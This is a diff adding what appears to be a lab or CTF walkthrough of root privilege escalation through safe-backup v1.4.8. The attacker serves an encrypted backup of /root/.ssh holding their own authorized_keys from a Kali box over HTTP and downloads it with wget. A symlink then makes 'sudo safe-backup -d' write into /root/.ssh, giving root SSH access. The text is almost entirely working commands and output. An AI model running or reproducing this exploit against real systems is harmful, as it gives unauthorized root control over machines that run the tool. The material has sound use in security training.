@@ -1,0 +1,149 @@
+1) If we install safe-backup on our Kali machine, we can use it to create a backup of /root/.ssh/authorized_keys which we will restore on the target machine. First we need to install Node.js and safe-backup.
+
+
+kali@kali:~$ curl -sL https://deb.nodesource.com/setup_15.x | sudo -E bash -
+...
+kali@kali:~$ sudo apt install -y nodejs
+...
+kali@kali:~$ npm --version
+7.5.1
+kali@kali:~$ sudo npm install -g safe-backup 
+...
+kali@kali:~$ safe-backup -v
+
+ Safe Backup v1.4.8
+ Github: https://github.com/scrwdrv/safe-backup
+ 
+ 
+ 2) Next we generate and backup an SSH keypair.
+ 
+ kali@kali:~$ sudo ssh-keygen
+Generating public/private rsa key pair.
+Enter file in which to save the key (/root/.ssh/id_rsa): 
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in /root/.ssh/id_rsa
+Your public key has been saved in /root/.ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:1CfzXc2JIZyi2W+HIh80qEQeLkgP1ew0QzDvqWRY6bc root@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|  .+=.    ....   |
+| o  +O   o o. o.o|
+|. +o*.+ * = .. .+|
+| .+o.=.= + = . . |
+| . +o+. S o o .  |
+|  o o... o + .   |
+|   . E  o + .    |
+|         .       |
+|                 |
++----[SHA256]-----+
+kali@kali:~$ sudo cp /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys
+
+
+
+3) And create a backup in a temporary directory.
+
+kali@kali:~$ sudo safe-backup -i /root/.ssh -o /tmp/backup            
+
+ Safe Backup v1.4.8
+ Github: https://github.com/scrwdrv/safe-backup
+
+2021-02-03 00:37:17 ¦ [00] -MASTER ¦  WARN ¦ Key pair not found, let's make one!
+
+Set your password for encryption: 
+ > password
+
+Please confirm your password is password [Y/N]? 
+ > Y
+2021-02-03 00:37:20 ¦ [00] -MASTER ¦  INFO ¦ Generating new RSA-4096 key pair...
+2021-02-03 00:37:21 ¦ [00] -MASTER ¦  INFO ¦ Public & private key generated at /root/.config/safe-backup/key.safe
+2021-02-03 00:37:21 ¦ [00] -MASTER ¦  INFO ¦ safe-backup is up to date, good for you!
+2021-02-03 00:37:22 ¦ [04] -WORKER ¦  INFO ¦ Syncing & encrypting folder... [/root/.ssh]
+2021-02-03 00:37:22 ¦ [00] -MASTER ¦  INFO ¦ Synced & encrypted [0.01s][7.21 KB][0.64 MBps][F:(+3)(-0)][D:(+1)(-0)][/root/.ssh]
+2021-02-03 00:37:22 ¦ [00] -MASTER ¦  INFO ¦ Saving logs before exit...
+
+
+4) We then copy the encryption key to the backup directory and host everything over HTTP.
+
+kali@kali:~$ sudo cp /root/.config/safe-backup/key.safe /tmp/backup/key.safe
+kali@kali:~$ cd /tmp/backup
+kali@kali:/tmp/backup$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+5) We’re now ready to start downloading files to our target. First, we’ll download and import the key we used to create the backup.
+
+arnold@bunyip:~$ wget http://KALI/key.safe -O /home/arnold/key.safe
+--2021-02-03 05:47:31--  http://KALI/key.safe
+Connecting to KALI:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7911 (7.7K) [application/octet-stream]
+Saving to: ‘/home/arnold/key.safe’
+
+/home/arnold/key.sa 100%[===================>]   7.73K  --.-KB/s    in 0s      
+
+2021-02-03 05:47:31 (691 MB/s) - ‘/home/arnold/key.safe’ saved [7911/7911]
+arnold@bunyip:~$ sudo safe-backup --import-key /home/arnold/key.safe
+
+ Safe Backup v1.4.8
+ Github: https://github.com/scrwdrv/safe-backup
+
+Key imported
+
+
+6) Next, we’ll download the backup.
+arnold@bunyip:~$ mkdir /tmp/backup
+arnold@bunyip:~$ wget http://KALI/-root-.ssh.bua -O /tmp/backup/-root-.ssh.bua
+--2021-02-03 05:48:21--  http://KALI/-root-.ssh.bua
+Connecting to KALI:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7383 (7.2K) [application/octet-stream]
+Saving to: ‘/tmp/backup/-root-.ssh.bua’
+
+/tmp/backup/-root-. 100%[===================>]   7.21K  --.-KB/s    in 0s      
+
+2021-02-03 05:48:21 (638 MB/s) - ‘/tmp/backup/-root-.ssh.bua’ saved [7383/7383]
+
+
+7) When decrypting files, safe-backup creates a new directory with the same name as the backup but without the .bua extension. If this directory already exists, the existing directory is used rather than a new one being created. We can exploit this by creating a symbolic link to /root/.ssh and having safe-backup decrypt folders into this directory.
+arnold@bunyip:~$ ln -s /root/.ssh /tmp/backup/-root-.ssh
+arnold@bunyip:~$ sudo safe-backup -d /tmp/backup/-root-.ssh.bua
+
+ Safe Backup v1.4.8
+ Github: https://github.com/scrwdrv/safe-backup
+
+
+Enter your password: 
+ > password
+2021-02-03 05:57:31 ¦ [01] -WORKER ¦  INFO ¦ Decrypting & extracting file... [/tmp/backup/-root-.ssh.bua]
+2021-02-03 05:57:31 ¦ [00] -MASTER ¦  INFO ¦ Decrypted, duration: 0.12s [/tmp/backup/-root-.ssh.bua]
+2021-02-03 05:57:31 ¦ [00] -MASTER ¦  INFO ¦ Your decrypted file/folder can be found at /tmp/backup/-root-.ssh
+2021-02-03 05:57:31 ¦ [00] -MASTER ¦  INFO ¦ Saving logs before exit...
+
+
+8) We can now ssh in as root.
+kali@kali:~$ sudo ssh -i /root/.ssh/id_rsa root@192.168.83.136
+Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-65-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Wed 03 Feb 2021 06:07:33 AM UTC
+
+  System load:  0.98               Processes:              210
+  Usage of /:   33.7% of 13.71GB   Users logged in:        1
+  Memory usage: 31%                IPv4 address for ens33: 192.168.83.136
+  Swap usage:   0%
+
+
+4 updates can be installed immediately.
+4 of these updates are security updates.
+To see these additional updates run: apt list --upgradable
+
+
+Last login: Wed Feb  3 06:07:11 2021 from 192.168.83.1
+root@bunyip:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
